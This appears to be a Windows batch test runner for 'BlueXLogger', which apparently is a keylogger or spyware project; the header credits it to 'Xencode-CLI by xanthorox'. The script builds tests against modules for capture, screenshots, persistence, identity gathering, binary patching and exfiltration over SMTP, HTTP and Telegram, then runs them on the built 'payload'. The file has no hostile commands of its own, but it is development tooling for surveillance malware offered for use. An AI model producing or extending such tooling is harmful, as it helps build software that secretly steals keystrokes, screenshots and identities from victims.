@echo off
rem ===========================================================================
rem BlueXLogger - tests/run_tests.bat
rem Compiles and runs the automated test suite.
rem Created by Xencode-CLI by xanthorox
rem
rem Invoked by build/build.bat stage [5/6], and runnable standalone:
rem     tests\run_tests.bat
rem The freshly built payload is passed to the harness so the configuration
rem suite can patch a real copy of it and read the settings back out.
rem ===========================================================================
setlocal enabledelayedexpansion
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
if errorlevel 1 (
    echo TESTS_BUILD_FAILED: vcvars64.bat not found or failed
    exit /b 1
)

cd /d "%~dp0.."
if not exist build\obj\tests mkdir build\obj\tests
if not exist build\bin       mkdir build\bin

set CFLAGS=/nologo /c /MT /W4 /WX- /O2 /D_CRT_SECURE_NO_WARNINGS /DNDEBUG /Iinclude /Ires /Itests
set LIBS=user32.lib gdi32.lib shell32.lib advapi32.lib ole32.lib oleaut32.lib ws2_32.lib secur32.lib crypt32.lib windowscodecs.lib

echo.
echo === [tests] compiling ===================================================
cl %CFLAGS% /Fobuild\obj\tests\ ^
   src\common\bxl_config.c src\common\bxl_util.c src\common\bxl_base64.c ^
   src\common\bxl_format.c src\common\bxl_schedule.c src\common\bxl_logbuf.c ^
   src\common\bxl_mime.c src\common\bxl_net.c src\common\bxl_smtp.c ^
   src\common\bxl_http.c src\common\bxl_telegram.c src\common\bxl_identity.c ^
   src\common\bxl_screenshot.c src\common\bxl_context.c src\common\bxl_capture.c ^
   src\common\bxl_persist.c src\common\bxl_patch.c ^
   tests\framework.c tests\test_format.c tests\test_config.c ^
   tests\test_schedule.c tests\test_smtp.c tests\test_http.c ^
   tests\test_telegram.c tests\test_identity.c tests\test_spool.c ^
   tests\test_screenshot.c tests\main.c
if errorlevel 1 goto :fail

echo.
echo === [tests] linking =====================================================
link /nologo /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF ^
     /OUT:build\bin\bxl_tests.exe build\obj\tests\*.obj %LIBS%
if errorlevel 1 goto :fail

echo.
echo === [tests] running =====================================================
set PAYLOAD=
if exist build\bin\BlueXLogger.exe set PAYLOAD=build\bin\BlueXLogger.exe

build\bin\bxl_tests.exe %PAYLOAD%
set RC=%ERRORLEVEL%

echo.
if "%RC%"=="0" (echo TESTS_OK) else (echo TESTS_FAILED)
echo TESTS_EXITCODE=%RC%
endlocal & exit /b %RC%

:fail
echo.
echo TESTS_BUILD_FAILED
endlocal
exit /b 1
